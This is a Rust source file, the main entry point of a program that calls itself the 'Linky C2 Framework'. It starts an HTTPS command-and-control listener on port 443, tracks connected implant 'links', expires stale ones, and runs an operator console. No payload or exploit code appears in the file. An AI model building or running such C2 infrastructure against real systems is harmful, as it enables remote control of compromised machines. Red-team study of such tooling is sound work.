mod cli;
mod generate;
mod links;
mod routes;
mod server;
mod tasks;

use std::sync::{Arc, Mutex};

use links::Links;

fn main() {
    // Initialize tracing subscriber
    tracing_subscriber::fmt()
        .with_env_filter("linky=info,actix_web=info,actix_server=info")
        .init();

    // rustls 0.23 requires an explicit CryptoProvider to be installed before any TLS usage.
    rustls::crypto::aws_lc_rs::default_provider()
        .install_default()
        .expect("Failed to install aws-lc-rs CryptoProvider");

    let bind_addr = std::env::args()
        .nth(1)
        .unwrap_or_else(|| "0.0.0.0:443".to_string());

    tracing::info!("╔══════════════════════════════╗");
    tracing::info!("║       Linky C2 Framework     ║");
    tracing::info!("╚══════════════════════════════╝");
    tracing::info!("Starting HTTPS listener on {}", bind_addr);

    let links = Arc::new(Mutex::new(Links::default()));

    // Start HTTPS C2 server in its own OS thread (actix uses Rc internally → not Send)
    let links_srv = links.clone();
    std::thread::spawn(move || {
        let sys = actix_web::rt::System::new();
        sys.block_on(async move {
            if let Err(e) = server::start(links_srv, &bind_addr).await {
                tracing::error!("Server error: {}", e);
                std::process::exit(1);
            }
        });
    });

    // Background thread: mark stale links as inactive every 30 s
    let links_gc = links.clone();
    std::thread::spawn(move || loop {
        std::thread::sleep(std::time::Duration::from_secs(30));
        links_gc.lock().unwrap().mark_inactive();
    });

    // CLI runs on the main thread (rustyline is synchronous)
    cli::run(links);
}
